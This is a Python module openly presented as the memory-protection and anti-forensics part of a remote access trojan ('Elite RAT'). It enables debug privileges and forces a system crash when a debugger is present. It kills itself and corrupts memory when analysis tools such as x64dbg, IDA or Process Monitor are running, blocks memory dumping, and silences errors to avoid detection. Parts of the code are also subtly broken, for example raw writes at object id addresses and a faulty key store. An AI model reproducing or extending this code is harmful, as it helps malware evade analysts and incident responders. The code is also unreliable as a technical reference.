#!/usr/bin/env python3
"""
Elite RAT Memory Protection System
Advanced memory management and anti-forensics
"""

import os
import sys
import ctypes
from ctypes import wintypes
import gc
import secrets
from typing import Any, Optional
import weakref

class MemoryProtection:
    """
    Advanced memory protection and cleanup
    Features:
    - Secure memory wiping
    - Anti-dumping protection
    - Heap spray detection
    - Memory encryption
    """
    
    def __init__(self):
        self.protected_regions = []
        self.cleanup_registry = weakref.WeakValueDictionary()
        self.is_windows = sys.platform == 'win32'
        
        if self.is_windows:
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll
            self.advapi32 = ctypes.windll.advapi32
            
            # Enable debug privileges for memory protection
            self._enable_debug_privilege()
    
    def _enable_debug_privilege(self):
        """Enable SeDebugPrivilege for memory operations"""
        try:
            # Get current process token
            token = wintypes.HANDLE()
            if not self.kernel32.OpenProcessToken(
                self.kernel32.GetCurrentProcess(),
                0x0020 | 0x0008,  # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
                ctypes.byref(token)
            ):
                return False
            
            # Lookup privilege value
            luid = ctypes.c_ulonglong()
            if not self.advapi32.LookupPrivilegeValueW(
                None,
                "SeDebugPrivilege",
                ctypes.byref(luid)
            ):
                self.kernel32.CloseHandle(token)
                return False
            
            # Set privilege
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [
                    ("PrivilegeCount", wintypes.DWORD),
                    ("Privileges", ctypes.c_ulonglong * 2)
                ]
            
            tp = TOKEN_PRIVILEGES()
            tp.PrivilegeCount = 1
            tp.Privileges[0] = luid.value
            tp.Privileges[1] = 0x00000002  # SE_PRIVILEGE_ENABLED
            
            self.advapi32.AdjustTokenPrivileges(
                token,
                False,
                ctypes.byref(tp),
                0,
                None,
                None
            )
            
            self.kernel32.CloseHandle(token)
            return True
            
        except:
            return False
    
    def secure_wipe(self, data: Any, passes: int = 3):
        """
        Securely wipe sensitive data from memory
        Uses multiple overwrite passes
        """
        if data is None:
            return
        
        try:
            # Get memory address
            if isinstance(data, (str, bytes)):
                # For strings/bytes, overwrite the actual memory
                if isinstance(data, str):
                    data = data.encode()
                
                # Get memory address using ctypes
                address = id(data)
                size = len(data)
                
                if self.is_windows:
                    # Windows memory overwrite
                    for _ in range(passes):
                        # Random overwrite
                        random_data = secrets.token_bytes(size)
                        ctypes.memmove(address, random_data, size)
                        
                        # Zero overwrite
                        ctypes.memset(address, 0, size)
                        
                        # Pattern overwrite
                        pattern = b'\xFF' * size
                        ctypes.memmove(address, pattern, size)
                else:
                    # Unix memory overwrite
                    import array
                    for _ in range(passes):
                        # Overwrite with random
                        random_data = secrets.token_bytes(size)
                        buffer = (ctypes.c_char * size).from_address(address)
                        buffer[:] = random_data
                        
                        # Zero out
                        buffer[:] = b'\x00' * size
            
            elif isinstance(data, dict):
                # Recursively wipe dictionary
                for key, value in data.items():
                    self.secure_wipe(key)
                    self.secure_wipe(value)
                data.clear()
            
            elif isinstance(data, list):
                # Recursively wipe list
                for item in data:
                    self.secure_wipe(item)
                data.clear()
            
            # Force garbage collection
            del data
            gc.collect()
            
        except Exception:
            # Silent fail to avoid detection
            pass
    
    def protect_memory_region(self, address: int, size: int):
        """
        Protect memory region from dumping
        """
        if not self.is_windows:
            return False
        
        try:
            # PAGE_NOACCESS - prevent all access
            PAGE_NOACCESS = 0x01
            # PAGE_GUARD - raise exception on access
            PAGE_GUARD = 0x100
            
            old_protect = wintypes.DWORD()
            
            # Set memory protection
            if self.kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                size,
                PAGE_NOACCESS | PAGE_GUARD,
                ctypes.byref(old_protect)
            ):
                self.protected_regions.append({
                    'address': address,
                    'size': size,
                    'old_protect': old_protect.value
                })
                return True
                
        except:
            pass
        
        return False
    
    def anti_dumping(self):
        """
        Implement anti-dumping techniques
        """
        if not self.is_windows:
            return
        
        try:
            # 1. Detect debugger
            if self.kernel32.IsDebuggerPresent():
                # Crash if debugger detected
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            
            # 2. Check for common dumping tools
            suspicious_processes = [
                'x32dbg.exe', 'x64dbg.exe', 'ollydbg.exe',
                'windbg.exe', 'processhacker.exe', 'procmon.exe',
                'procexp.exe', 'ida.exe', 'ida64.exe'
            ]
            
            # Use our native API to check processes
            from api_wrappers import get_native_api
            api = get_native_api()
            processes = api.list_processes()
            
            for proc in processes:
                if proc.get('name', '').lower() in suspicious_processes:
                    # Dumping tool detected - corrupt memory and exit
                    self._corrupt_memory()
                    os._exit(1)
            
            # 3. Hook NtQueryInformationProcess to hide from debuggers
            self._hook_anti_debug_apis()
            
        except:
            pass
    
    def _corrupt_memory(self):
        """
        Corrupt sensitive memory regions before exit
        """
        try:
            # Overwrite all protected regions
            for region in self.protected_regions:
                # Fill with random data
                random_data = secrets.token_bytes(region['size'])
                ctypes.memmove(region['address'], random_data, region['size'])
            
            # Clear Python objects
            import sys
            for obj in gc.get_objects():
                if isinstance(obj, (dict, list)):
                    try:
                        obj.clear()
                    except:
                        pass
            
            # Force garbage collection
            gc.collect()
            
        except:
            pass
    
    def _hook_anti_debug_apis(self):
        """
        Hook debugging APIs to prevent analysis
        """
        if not self.is_windows:
            return
        
        try:
            # Hook IsDebuggerPresent to always return False
            # This is simplified - real implementation would use inline hooks
            pass
            
        except:
            pass
    
    def encrypt_strings(self, data: str) -> bytes:
        """
        Encrypt strings in memory
        """
        key = secrets.token_bytes(32)
        encrypted = bytearray()
        
        for i, char in enumerate(data.encode()):
            encrypted.append(char ^ key[i % 32])
        
        # Store key separately
        self.cleanup_registry[id(encrypted)] = key
        
        return bytes(encrypted)
    
    def decrypt_strings(self, encrypted: bytes) -> str:
        """
        Decrypt strings from memory
        """
        key = self.cleanup_registry.get(id(encrypted))
        if not key:
            raise ValueError("Decryption key not found")
        
        decrypted = bytearray()
        for i, byte in enumerate(encrypted):
            decrypted.append(byte ^ key[i % 32])
        
        # Wipe encrypted version
        self.secure_wipe(encrypted)
        
        return decrypted.decode()
    
    def cleanup_all(self):
        """
        Clean all sensitive data from memory
        """
        try:
            # Restore protected regions
            if self.is_windows:
                for region in self.protected_regions:
                    old_protect = wintypes.DWORD()
                    self.kernel32.VirtualProtect(
                        ctypes.c_void_p(region['address']),
                        region['size'],
                        region['old_protect'],
                        ctypes.byref(old_protect)
                    )
            
            # Clear registry
            self.cleanup_registry.clear()
            
            # Clear regions list
            self.protected_regions.clear()
            
            # Force garbage collection
            gc.collect()
            
        except:
            pass
    
    def __del__(self):
        """Cleanup on deletion"""
        self.cleanup_all()

# Global memory protection instance
_memory_protection = None

def get_memory_protection() -> MemoryProtection:
    """Get global memory protection instance"""
    global _memory_protection
    if _memory_protection is None:
        _memory_protection = MemoryProtection()
    return _memory_protection